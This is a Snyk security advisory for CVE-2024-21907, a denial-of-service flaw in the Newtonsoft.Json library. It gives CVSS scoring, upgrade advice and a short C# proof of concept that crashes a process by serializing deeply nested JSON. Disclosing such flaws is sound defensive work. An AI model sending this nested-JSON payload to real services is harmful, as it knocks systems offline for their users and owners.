### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

#### Introduced: 24 Apr 2022

[CVE-2024-21907  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21907) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-755  (opens in a new tab)](https://cwe.mitre.org/data/definitions/755.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

Upgrade `Newtonsoft.Json` to version 13.0.1 or higher.

## Overview

Affected versions of this package are vulnerable to Insecure Defaults due to improper handling of StackOverFlow exception (SOE) whenever nested expressions are being processed.

## PoC

```

using System;

using System.IO;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace JsonTests
{
    class Program
    {
        static void Main(string[] args)
        {
            //Create a string representation of a highly nested object (JSON serialized)
            int nRep = 24000;
            string json = string.Concat(Enumerable.Repeat("{a:", nRep)) + "1" +
                          string.Concat(Enumerable.Repeat("}", nRep));

            //Parse this object (Parsing works well - no exception is being thrown)
            var parsedJson = JObject.Parse(json);

            using (var ms = new MemoryStream())
            using (var sWriter = new StreamWriter(ms))
            using (var jWriter = new JsonTextWriter(sWriter))
            {
                //Trying to serialize the object will result in StackOverflowException !!!
                parsedJson.WriteTo(jWriter);
            }

            //ToString throws StackOverflowException as well  (ToString is very unefficient - even for smaller payloads, it will occupy a lot of CPU & Memory)
            //parsedJson.ToString();

            //JsonConvert.SerializeObject throws StackOverflowException as well
            //string a = JsonConvert.SerializeObject(parsedJson);

        }
    }
}

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).
